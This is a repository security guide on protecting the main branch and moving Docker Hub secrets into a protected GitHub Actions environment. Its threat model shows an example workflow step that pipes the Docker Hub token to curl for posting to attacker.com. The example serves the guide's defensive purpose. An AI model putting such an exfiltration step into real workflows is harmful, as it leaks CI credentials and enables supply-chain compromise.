# Branch Protection Setup Guide - Issue #455

**Created by**: Blake (Security Architect)
**Date**: 2025-10-01
**Risk Level**: CRITICAL
**Repository**: ryanmaclean/vibecode-webgui

## Executive Summary

This guide provides step-by-step instructions for implementing branch protection on the `main` branch to prevent workflow modification attacks and secret exfiltration. The current lack of branch protection allows anyone with write access to modify GitHub Actions workflows and exfiltrate Docker Hub credentials.

**Current Risk**: CRITICAL - Unprotected main branch enables secret exfiltration via workflow modifications
**Target State**: LOW - All changes require PR review + status checks before merging
**Implementation Time**: 30-45 minutes
**Required Access**: Repository administrator permissions

---

## Table of Contents

1. [Threat Model](#threat-model)
2. [Required Settings](#required-settings)
3. [GitHub UI Implementation](#github-ui-implementation)
4. [Protected Environment Setup](#protected-environment-setup)
5. [Secret Migration](#secret-migration)
6. [Verification Steps](#verification-steps)
7. [Rollback Procedures](#rollback-procedures)
8. [Maintenance](#maintenance)

---

## Threat Model

### Attack Vector: Workflow Modification

**Scenario**: Attacker with write access exploits lack of branch protection

**Attack Steps**:
1. Attacker pushes malicious workflow change directly to `main` branch
2. Workflow modified to exfiltrate secrets:
   ```yaml
   - name: Exfiltrate Docker Hub Token
     run: |
       echo "${{ secrets.DOCKERHUB_TOKEN }}" | base64 | curl -X POST https://attacker.com/collect -d @-
   ```
3. Workflow executes, credentials sent to attacker
4. Attacker uses credentials to compromise Docker Hub account

**Impact**:
- Docker Hub account compromise
- Malicious container image injection
- Supply chain attack via poisoned images
- Reputational damage
- Service disruption

**Likelihood Without Protection**: HIGH (requires only write access)
**Likelihood With Protection**: LOW (requires PR review + status checks bypass)

---

## Required Settings

### Branch Protection Rules

| Setting | Value | Rationale |
|---------|-------|-----------|
| **Branch name pattern** | `main` | Protect default branch |
| **Require pull request** | YES | Force code review workflow |
| **Required approvals** | 1 | Balance security with velocity |
| **Dismiss stale reviews** | YES | Re-review after new commits |
| **Require review from Code Owners** | NO (initially) | Optional enhancement |
| **Require status checks** | YES | Enforce CI validation |
| **Status checks to require** | See table below | Leverage existing CI |
| **Require branches to be up to date** | YES (strict mode) | Prevent merge conflicts |
| **Require signed commits** | NO (initially) | Optional enhancement |
| **Require linear history** | NO | Allow merge commits |
| **Include administrators** | YES | No bypass for admins |
| **Allow force pushes** | NO | Prevent history rewriting |
| **Allow deletions** | NO | Prevent accidental removal |

### Required Status Checks

Based on analysis of `.github/workflows/`, require these checks:

| Status Check Name | Purpose | Workflow File |
|-------------------|---------|---------------|
| `validate-ci-config` | Verify secrets/vars configuration | `main-branch-ci.yml` |
| `quick-validation` | Fast lint, typecheck, unit tests | `main-branch-ci.yml` |
| `security-check` | npm audit + TruffleHog scan | `main-branch-ci.yml` |
| `build-check` | Production build validation | `main-branch-ci.yml` |
| `code-quality` | Full lint + security audit | `main-branch-ci.yml` |
| `root-tests` | Integration tests (DB/Redis) | `main-branch-ci.yml` |
| `build-test` | Full build with artifacts | `main-branch-ci.yml` |

**Note**: These checks already exist in your CI pipeline and will automatically gate merges once branch protection is enabled.

---

## GitHub UI Implementation

### Step 1: Navigate to Branch Protection Settings

1. Open browser and navigate to repository settings:
   ```
   https://github.com/ryanmaclean/vibecode-webgui/settings/branches
   ```

2. Verify you have administrator access:
   - Settings tab should be visible
   - "Branches" option should be in left sidebar

3. Click "Add branch protection rule" button

### Step 2: Configure Basic Protection

**Branch name pattern**:
```
main
```

**Protect matching branches** section:

1. Check: **"Require a pull request before merging"**
   - Required approving reviews: `1`
   - Check: **"Dismiss stale pull request approvals when new commits are pushed"**
   - Leave unchecked: "Require review from Code Owners" (can enable later)
   - Leave unchecked: "Restrict who can dismiss pull request reviews"
   - Leave unchecked: "Allow specified actors to bypass pull request requirements"

2. Check: **"Require status checks to pass before merging"**
   - Check: **"Require branches to be up to date before merging"** (strict mode)

3. In "Status checks that are required" search box, add each check:
   - Type `validate-ci-config` → Click to add
   - Type `quick-validation` → Click to add
   - Type `security-check` → Click to add
   - Type `build-check` → Click to add
   - Type `code-quality` → Click to add
   - Type `root-tests` → Click to add
   - Type `build-test` → Click to add

   **Note**: Status checks appear after first workflow run. If not visible, skip this step initially and add after first PR.

### Step 3: Configure Advanced Protection

Scroll down to additional settings:

1. Leave unchecked: "Require conversation resolution before merging" (optional)
2. Leave unchecked: "Require signed commits" (can enable after team GPG setup)
3. Leave unchecked: "Require linear history" (allow merge commits)
4. Check: **"Do not allow bypassing the above settings"** (enforce for administrators)
5. Leave unchecked: "Restrict who can push to matching branches"
6. Uncheck: **"Allow force pushes"** (prevent history rewriting)
7. Uncheck: **"Allow deletions"** (prevent accidental branch removal)

### Step 4: Save Configuration

1. Scroll to bottom of page
2. Click **"Create"** button (green)
3. Confirm protection rule created:
   - Green banner should appear: "Branch protection rule created"
   - Rule should appear in list with branch pattern `main`

**Screenshot Reference**:
```
┌─────────────────────────────────────────────────────────────┐
│ Branch protection rules                                      │
├─────────────────────────────────────────────────────────────┤
│ main                                                          │
│ • Require pull request reviews (1 approval)                  │
│ • Require status checks (7 checks)                           │
│ • Include administrators                                     │
│ [Edit] [Delete]                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Protected Environment Setup

### Why Protected Environments?

Branch protection prevents direct workflow modification, but secrets remain accessible to all workflows. Protected environments add a second layer of defense by requiring manual approval before accessing sensitive credentials.

### Step 1: Create Protected Environment

1. Navigate to environment settings:
   ```
   https://github.com/ryanmaclean/vibecode-webgui/settings/environments
   ```

2. Click **"New environment"** button

3. Environment name:
   ```
   docker-publish
   ```

4. Click **"Configure environment"**

### Step 2: Configure Environment Protection

**Deployment protection rules**:

1. Check: **"Required reviewers"**
   - Click "Add reviewer"
   - Search for `ryanmaclean` (or other maintainer)
   - Select and confirm
   - **Recommendation**: Add at least 1 reviewer, ideally 2 for redundancy

2. **Deployment branches and tags**:
   - Select: **"Protected branches only"**
   - This restricts environment access to `main` branch only

3. **Wait timer**: Leave empty (no delay needed)

4. **Custom deployment protection rules**: Leave empty (no external systems)

5. Click **"Save protection rules"**

### Step 3: Verify Environment Created

Environment should now appear in list:
```
┌─────────────────────────────────────────────────────────────┐
│ Environments                                                  │
├─────────────────────────────────────────────────────────────┤
│ docker-publish                                                │
│ • Required reviewers: ryanmaclean                             │
│ • Deployment branches: Protected branches only                │
│ [Configure]                                                   │
└─────────────────────────────────────────────────────────────┘
```

---

## Secret Migration

### Current State (INSECURE)

Docker Hub credentials currently stored as repository secrets, accessible to all workflows:

```yaml
# .github/workflows/codeserver-profiles.yml (CURRENT - INSECURE)
- name: Log in to Docker Hub
  uses: docker/login-action@v3
  with:
    registry: docker.io
    username: ${{ secrets.DOCKERHUB_USERNAME }}
    password: ${{ secrets.DOCKERHUB_TOKEN }}
```

### Target State (SECURE)

Credentials moved to protected environment, requiring approval for access:

```yaml
# .github/workflows/codeserver-profiles.yml (TARGET - SECURE)
jobs:
  publish:
    environment: docker-publish  # Requires approval
    steps:
      - name: Log in to Docker Hub
        uses: docker/login-action@v3
        with:
          registry: docker.io
          username: ${{ secrets.DOCKERHUB_USERNAME }}
          password: ${{ secrets.DOCKERHUB_TOKEN }}
```

### Step 1: Copy Secrets to Environment

**IMPORTANT**: Keep repository secrets until workflow migration is complete and verified.

1. Navigate to repository secrets:
   ```
   https://github.com/ryanmaclean/vibecode-webgui/settings/secrets/actions
   ```

2. Locate existing secrets:
   - `DOCKERHUB_USERNAME`
   - `DOCKERHUB_TOKEN`

3. Copy `DOCKERHUB_USERNAME` value:
   - Click secret name
   - Click "Update secret"
   - Copy value (will be masked, use clipboard)
   - Cancel (don't modify)

4. Navigate to environment secrets:
   ```
   https://github.com/ryanmaclean/vibecode-webgui/settings/environments/docker-publish/secrets
   ```

5. Add environment secret:
   - Click "Add secret"
   - Name: `DOCKERHUB_USERNAME`
   - Value: Paste copied value
   - Click "Add secret"

6. Repeat for `DOCKERHUB_TOKEN`:
   - Navigate back to repository secrets
   - Copy `DOCKERHUB_TOKEN` value
   - Add to `docker-publish` environment

### Step 2: Update Workflow Files

Modify workflows to use protected environment. Files requiring changes:

**Priority 1 (Docker Hub publishing)**:
- `.github/workflows/codeserver-profiles.yml`
- `.github/workflows/codeserver-multiarch.yml`
- `.github/workflows/build-and-push-image.yml`

**Example modification**:

```diff
# .github/workflows/codeserver-profiles.yml

jobs:
  build-and-push:
+   environment: docker-publish  # ADD THIS LINE
    runs-on: ubuntu-latest
    strategy:
      matrix:
        profile: [minimal, standard, ai, web, full]
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Log in to Docker Hub
        uses: docker/login-action@v3
        with:
          registry: docker.io
          username: ${{ secrets.DOCKERHUB_USERNAME }}
          password: ${{ secrets.DOCKERHUB_TOKEN }}
```

**Key change**: Add `environment: docker-publish` to job definition (before `runs-on`).

### Step 3: Test Workflow with Environment Protection

1. Create test branch:
   ```bash
   git checkout -b test/environment-protection
   ```

2. Make changes to workflows (add `environment: docker-publish`)

3. Commit and push:
   ```bash
   git add .github/workflows/
   git commit -m "security: migrate Docker Hub secrets to protected environment

   - Add environment: docker-publish to publishing jobs
   - Requires manual approval before accessing credentials
   - Addresses secret exfiltration risk from #455"

   git push origin test/environment-protection
   ```

4. Create PR:
   ```bash
   gh pr create --title "security: migrate Docker Hub secrets to protected environment" \
     --body "Migrates Docker Hub credentials to protected environment requiring manual approval.

   **Security Impact**:
   - Docker Hub credentials now require approval before access
   - Prevents secret exfiltration via workflow modifications
   - Addresses critical risk identified in #455

   **Testing**:
   - [ ] Workflow requires approval before Docker login
   - [ ] Build completes successfully after approval
   - [ ] Images published to Docker Hub

   Closes #455"
   ```

5. Merge PR (will require approval due to branch protection)

6. Trigger workflow manually:
   ```bash
   gh workflow run codeserver-profiles.yml
   ```

7. Observe approval gate:
   - Navigate to Actions tab
   - Workflow will pause with "Waiting for approval"
   - Click "Review deployments"
   - Check `docker-publish`
   - Click "Approve and deploy"
   - Workflow continues after approval

### Step 4: Remove Repository Secrets (After Verification)

**ONLY after confirming workflows work with environment secrets**:

1. Navigate to repository secrets:
   ```
   https://github.com/ryanmaclean/vibecode-webgui/settings/secrets/actions
   ```

2. Delete repository-level secrets:
   - Click `DOCKERHUB_USERNAME` → "Remove secret" → Confirm
   - Click `DOCKERHUB_TOKEN` → "Remove secret" → Confirm

3. Verify secrets only exist in environment:
   ```bash
   gh api repos/ryanmaclean/vibecode-webgui/actions/secrets | jq -r '.secrets[].name'
   # Should NOT show DOCKERHUB_USERNAME or DOCKERHUB_TOKEN

   gh api repos/ryanmaclean/vibecode-webgui/environments/docker-publish/secrets | jq -r '.secrets[].name'
   # Should show DOCKERHUB_USERNAME and DOCKERHUB_TOKEN
   ```

---

## Verification Steps

### Verify Branch Protection Enabled

**Method 1: GitHub API (Recommended)**

```bash
gh api repos/ryanmaclean/vibecode-webgui/branches/main/protection | jq '{
  required_pull_request_reviews: .required_pull_request_reviews.required_approving_review_count,
  required_status_checks: .required_status_checks.checks[].context,
  enforce_admins: .enforce_admins.enabled,
  allow_force_pushes: .allow_force_pushes.enabled,
  allow_deletions: .allow_deletions.enabled
}'
```

**Expected output**:
```json
{
  "required_pull_request_reviews": 1,
  "required_status_checks": [
    "validate-ci-config",
    "quick-validation",
    "security-check",
    "build-check",
    "code-quality",
    "root-tests",
    "build-test"
  ],
  "enforce_admins": true,
  "allow_force_pushes": false,
  "allow_deletions": false
}
```

**Method 2: GitHub UI**

1. Navigate to: `https://github.com/ryanmaclean/vibecode-webgui/settings/branches`
2. Verify `main` branch has rule listed
3. Click "Edit" to review settings

**Method 3: Direct Push Test (Should Fail)**

```bash
# Create test file
echo "test" > test-branch-protection.txt
git add test-branch-protection.txt
git commit -m "test: verify branch protection blocks direct push"

# Attempt direct push to main (should fail)
git push origin main
```

**Expected error**:
```
remote: error: GH006: Protected branch update failed for refs/heads/main.
remote: error: Required status checks are expected.
To github.com:ryanmaclean/vibecode-webgui.git
 ! [remote rejected] main -> main (protected branch hook declined)
error: failed to push some refs to 'github.com:ryanmaclean/vibecode-webgui.git'
```

### Verify Protected Environment

**Method 1: GitHub API**

```bash
gh api repos/ryanmaclean/vibecode-webgui/environments/docker-publish | jq '{
  protection_rules: .protection_rules[] | {
    type,
    reviewers: .reviewers[]?.reviewer.login
  },
  deployment_branch_policy: .deployment_branch_policy
}'
```

**Expected output**:
```json
{
  "protection_rules": {
    "type": "required_reviewers",
    "reviewers": "ryanmaclean"
  },
  "deployment_branch_policy": {
    "protected_branches": true,
    "custom_branch_policies": false
  }
}
```

**Method 2: Workflow Run Test**

1. Trigger workflow that uses `docker-publish` environment
2. Navigate to Actions tab
3. Verify workflow pauses with "Waiting for approval" status
4. Confirm approval required before accessing secrets

### Verify Secret Isolation

**Check repository secrets (should NOT include Docker Hub)**:
```bash
gh api repos/ryanmaclean/vibecode-webgui/actions/secrets | jq -r '.secrets[].name' | grep -i docker
# Should return no results after migration
```

**Check environment secrets (should include Docker Hub)**:
```bash
gh api repos/ryanmaclean/vibecode-webgui/environments/docker-publish/secrets | jq -r '.secrets[].name'
```

**Expected output**:
```
DOCKERHUB_TOKEN
DOCKERHUB_USERNAME
```

### Security Validation Checklist

Use this checklist to confirm all protections are active:

```markdown
## Branch Protection Validation

- [ ] Direct push to main blocked (tested with git push)
- [ ] PR required for all changes
- [ ] 1 approval required before merge
- [ ] Stale reviews dismissed on new commits
- [ ] 7 status checks required: validate-ci-config, quick-validation, security-check, build-check, code-quality, root-tests, build-test
- [ ] Status checks must be up-to-date (strict mode)
- [ ] Force pushes disabled
- [ ] Branch deletion disabled
- [ ] Administrator bypass disabled

## Environment Protection Validation

- [ ] docker-publish environment created
- [ ] Required reviewers configured (minimum 1)
- [ ] Deployment restricted to protected branches only
- [ ] DOCKERHUB_USERNAME in environment secrets
- [ ] DOCKERHUB_TOKEN in environment secrets
- [ ] DOCKERHUB_USERNAME removed from repository secrets
- [ ] DOCKERHUB_TOKEN removed from repository secrets

## Workflow Protection Validation

- [ ] codeserver-profiles.yml uses environment: docker-publish
- [ ] codeserver-multiarch.yml uses environment: docker-publish
- [ ] build-and-push-image.yml uses environment: docker-publish
- [ ] Workflow run requires approval before Docker login
- [ ] Approval gate blocks execution until reviewer confirms

## Risk Validation

- [ ] Workflow modification attack requires PR review
- [ ] Secret exfiltration requires approval gate bypass
- [ ] Status checks validate security before merge
- [ ] All CI checks passing on main branch
```

---

## Rollback Procedures

### Scenario 1: Branch Protection Blocks Legitimate Work

**Symptoms**:
- Urgent fix blocked by PR requirement
- CI checks failing due to infrastructure issues
- Administrator needs emergency access

**Rollback Steps**:

1. Temporarily allow administrator bypass:
   ```bash
   gh api -X PUT repos/ryanmaclean/vibecode-webgui/branches/main/protection \
     --input - <<'EOF'
   {
     "required_pull_request_reviews": {
       "required_approving_review_count": 1,
       "dismiss_stale_reviews": true
     },
     "required_status_checks": {
       "strict": true,
       "checks": [
         {"context": "validate-ci-config"},
         {"context": "quick-validation"},
         {"context": "security-check"},
         {"context": "build-check"},
         {"context": "code-quality"},
         {"context": "root-tests"},
         {"context": "build-test"}
       ]
     },
     "enforce_admins": false,
     "allow_force_pushes": false,
     "allow_deletions": false,
     "restrictions": null
   }
   EOF
   ```

2. Make emergency change

3. Re-enable administrator enforcement:
   ```bash
   # Change "enforce_admins": false to "enforce_admins": true and re-apply
   ```

### Scenario 2: Environment Protection Blocks Critical Deployment

**Symptoms**:
- Production deployment urgent
- Required reviewer unavailable
- Security incident requires immediate action

**Rollback Steps**:

1. Temporarily remove required reviewers:
   - Navigate to: `https://github.com/ryanmaclean/vibecode-webgui/settings/environments/docker-publish`
   - Click "Configure environment"
   - Uncheck "Required reviewers"
   - Click "Save protection rules"

2. Trigger deployment (will proceed without approval)

3. Re-enable required reviewers after deployment

**Alternative**: Add additional reviewers for redundancy:
```bash
# Add backup reviewer to environment
gh api -X PUT repos/ryanmaclean/vibecode-webgui/environments/docker-publish \
  --input - <<'EOF'
{
  "reviewers": [
    {"type": "User", "id": 12345678},
    {"type": "User", "id": 87654321}
  ],
  "deployment_branch_policy": {"protected_branches": true}
}
EOF
```

### Scenario 3: Complete Rollback (Remove All Protections)

**Use only in emergency situations**:

```bash
# Remove branch protection
gh api -X DELETE repos/ryanmaclean/vibecode-webgui/branches/main/protection

# Remove environment protection
gh api -X DELETE repos/ryanmaclean/vibecode-webgui/environments/docker-publish

# Revert workflow changes (remove environment declarations)
git revert <commit-sha-that-added-environments>
```

**Re-enable protections**:
- Follow implementation steps from beginning
- Document incident and lessons learned
- Review what caused need for rollback

---

## Maintenance

### Weekly Security Checks

Run these commands weekly to verify protections remain active:

```bash
#!/bin/bash
# File: scripts/security/verify-branch-protection.sh

echo "=== Branch Protection Status ==="
gh api repos/ryanmaclean/vibecode-webgui/branches/main/protection \
  --jq 'if . then "✓ Branch protection ENABLED" else "✗ Branch protection DISABLED" end'

echo -e "\n=== Required Status Checks ==="
gh api repos/ryanmaclean/vibecode-webgui/branches/main/protection \
  --jq '.required_status_checks.checks[].context' \
  | while read check; do echo "  ✓ $check"; done

echo -e "\n=== Environment Protection Status ==="
gh api repos/ryanmaclean/vibecode-webgui/environments/docker-publish \
  --jq '"✓ Environment: docker-publish"'

echo -e "\n=== Required Reviewers ==="
gh api repos/ryanmaclean/vibecode-webgui/environments/docker-publish \
  --jq '.protection_rules[] | select(.type == "required_reviewers") | .reviewers[].reviewer.login' \
  | while read reviewer; do echo "  ✓ $reviewer"; done

echo -e "\n=== Environment Secrets ==="
gh api repos/ryanmaclean/vibecode-webgui/environments/docker-publish/secrets \
  --jq '.secrets[].name' \
  | while read secret; do echo "  ✓ $secret"; done
```

**Make executable and run**:
```bash
chmod +x scripts/security/verify-branch-protection.sh
./scripts/security/verify-branch-protection.sh
```

### Quarterly Reviews

Every 3 months, conduct comprehensive review:

1. **Audit required status checks**:
   - Verify all checks still relevant
   - Add new checks for new features
   - Remove checks for deprecated features

2. **Review required reviewers**:
   - Verify reviewers still active
   - Add backup reviewers
   - Remove inactive team members

3. **Validate secret isolation**:
   - Audit all environment secrets
   - Verify no secrets leaked to repository level
   - Rotate credentials per security policy

4. **Test protection effectiveness**:
   - Simulate attack scenarios
   - Verify protections block malicious changes
   - Document findings and improvements

### Credential Rotation

Rotate Docker Hub token every 90 days:

1. Generate new Docker Hub token:
   - Login to hub.docker.com
   - Account Settings → Security → New Access Token
   - Name: `vibecode-webgui-github-actions-YYYYMMDD`
   - Permissions: Read, Write, Delete (minimal required)
   - Expiration: 90 days
   - Copy token (shown only once)

2. Update environment secret:
   ```bash
   gh secret set DOCKERHUB_TOKEN --env docker-publish --body "$(cat new-token.txt)"
   ```

3. Test workflow with new token:
   ```bash
   gh workflow run codeserver-profiles.yml
   # Verify build succeeds
   ```

4. Revoke old token:
   - Docker Hub → Security → Find old token → Revoke

5. Document rotation:
   - Add entry to `docs/security/SECRET_ROTATION_LOG.md`
   - Include rotation date, token name, rotated by

### Status Check Updates

As CI evolves, update required status checks:

**Add new check**:
```bash
gh api -X PATCH repos/ryanmaclean/vibecode-webgui/branches/main/protection/required_status_checks \
  --input - <<'EOF'
{
  "strict": true,
  "checks": [
    {"context": "validate-ci-config"},
    {"context": "quick-validation"},
    {"context": "security-check"},
    {"context": "build-check"},
    {"context": "code-quality"},
    {"context": "root-tests"},
    {"context": "build-test"},
    {"context": "new-check-name"}
  ]
}
EOF
```

**Remove deprecated check**:
- Edit list above, remove unwanted check
- Re-apply with PATCH request

### Monitoring and Alerting

Set up monitoring for protection bypass attempts:

1. **GitHub Audit Log**:
   - Navigate to: `https://github.com/organizations/YOUR_ORG/settings/audit-log`
   - Filter: `action:protected_branch.*`
   - Review weekly for unauthorized changes

2. **Webhook Alerts** (optional):
   ```bash
   # Create webhook to notify on protection changes
   gh api -X POST repos/ryanmaclean/vibecode-webgui/hooks \
     --input - <<'EOF'
   {
     "config": {
       "url": "https://your-monitoring-system.com/github-webhooks",
       "content_type": "json"
     },
     "events": ["branch_protection_rule"]
   }
   EOF
   ```

3. **Status Check Monitoring**:
   - Monitor CI check pass rates
   - Alert on declining trends
   - Investigate check failures blocking legitimate work

---

## Additional Resources

### Related Documentation

- **GitHub Docs**: [About protected branches](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches)
- **GitHub Docs**: [Managing environments](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)
- **Security Checklist**: `docs/security/GITHUB_ACTIONS_SECURITY_CHECKLIST.md`
- **Quickstart Guide**: `docs/security/GITHUB_ACTIONS_QUICKSTART.md`

### Compliance Mappings

This implementation addresses requirements from:

- **SOC 2**: CC6.1 (Logical access controls), CC6.6 (Change management)
- **PCI DSS**: Requirement 6.3.2 (Review custom code), 7.1 (Access control)
- **ISO 27001**: A.9.4.5 (Access control review), A.14.2.5 (Secure development)
- **NIST 800-53**: AC-3 (Access enforcement), CM-3 (Configuration change control)

### Support Contacts

- **Security Issues**: Open issue with `security` label
- **Branch Protection Problems**: `@ryanmaclean` (repository owner)
- **CI/CD Questions**: `@devops-team`
- **Emergency Access**: Follow rollback procedures above

---

## Appendix: Repository Owner Checklist

Use this checklist to implement all protections:

```markdown
# Branch Protection Implementation - Issue #455

## Prerequisites
- [ ] Verified administrator access to repository
- [ ] Reviewed threat model and risk assessment
- [ ] Confirmed CI status checks are running
- [ ] Backed up current repository settings

## Branch Protection (30 min)
- [ ] Navigate to Settings → Branches
- [ ] Create branch protection rule for `main`
- [ ] Enable: Require pull request (1 approval)
- [ ] Enable: Dismiss stale reviews
- [ ] Enable: Require status checks (strict mode)
- [ ] Add required checks: validate-ci-config, quick-validation, security-check, build-check, code-quality, root-tests, build-test
- [ ] Enable: Do not allow bypassing (enforce for admins)
- [ ] Disable: Allow force pushes
- [ ] Disable: Allow deletions
- [ ] Save configuration
- [ ] Verify with: gh api repos/:owner/:repo/branches/main/protection
- [ ] Test direct push blocks (should fail)

## Protected Environment (15 min)
- [ ] Navigate to Settings → Environments
- [ ] Create new environment: docker-publish
- [ ] Enable: Required reviewers (add maintainers)
- [ ] Configure: Protected branches only
- [ ] Save protection rules
- [ ] Verify with: gh api repos/:owner/:repo/environments/docker-publish

## Secret Migration (20 min)
- [ ] Copy DOCKERHUB_USERNAME from repository secrets
- [ ] Add DOCKERHUB_USERNAME to docker-publish environment
- [ ] Copy DOCKERHUB_TOKEN from repository secrets
- [ ] Add DOCKERHUB_TOKEN to docker-publish environment
- [ ] Verify both secrets in environment: gh api repos/:owner/:repo/environments/docker-publish/secrets

## Workflow Updates (15 min)
- [ ] Create branch: test/environment-protection
- [ ] Edit: .github/workflows/codeserver-profiles.yml (add environment: docker-publish)
- [ ] Edit: .github/workflows/codeserver-multiarch.yml (add environment: docker-publish)
- [ ] Edit: .github/workflows/build-and-push-image.yml (add environment: docker-publish)
- [ ] Commit and push changes
- [ ] Create PR with security context
- [ ] Merge PR (will require approval)
- [ ] Trigger workflow: gh workflow run codeserver-profiles.yml
- [ ] Verify approval gate appears
- [ ] Approve deployment
- [ ] Confirm workflow completes successfully

## Cleanup (10 min)
- [ ] Verify workflows work with environment secrets (test 3 times)
- [ ] Delete DOCKERHUB_USERNAME from repository secrets
- [ ] Delete DOCKERHUB_TOKEN from repository secrets
- [ ] Verify secrets removed: gh api repos/:owner/:repo/actions/secrets
- [ ] Confirm only environment has secrets

## Validation (15 min)
- [ ] Run verification script: ./scripts/security/verify-branch-protection.sh
- [ ] Test direct push to main (should fail)
- [ ] Create test PR and verify approval required
- [ ] Verify status checks gate merge
- [ ] Test workflow trigger requires approval
- [ ] Confirm all 7 CI checks must pass

## Documentation (10 min)
- [ ] Update docs/SECURITY.md with new protections
- [ ] Document secret rotation schedule (90 days)
- [ ] Add monitoring script to weekly runbook
- [ ] Close issue #455 with completion summary

## Total Time: 115 minutes (1 hour 55 minutes)
```

---

**Document Version**: 1.0
**Last Updated**: 2025-10-01
**Next Review**: 2026-01-01 (Quarterly)
**Owner**: Blake (Security Architect)
**Approved By**: Repository Administrator

**Issue**: #455 - Protect main branch from workflow modification attacks
**Related Issues**: #416 (Docker Hub credentials protection)
